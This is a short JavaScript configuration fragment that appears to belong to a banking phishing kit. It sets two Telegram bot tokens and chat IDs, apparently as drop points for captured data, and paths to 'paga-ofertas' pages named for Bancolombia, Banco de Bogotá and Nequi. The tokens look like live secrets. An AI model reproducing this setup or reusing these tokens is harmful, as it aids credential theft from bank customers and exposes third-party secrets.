botToken = "6508328622:AAFkgwE_FD3-HIxRANBk3_e8cZNzM7Vvgyw";
chatId = "5594203235";

botToken2 = "7777890813:AAE_M-bJ_8ojhq-AfKGo0zojrJXrLUqYwFY";
chatId2 = "8171531318";

tricoe = "../../../paga-ofertas/bancolombia";
(bgt = "../../../paga-ofertas/bancobogota"),
neqe = "../../../paga-ofertas/nequi";

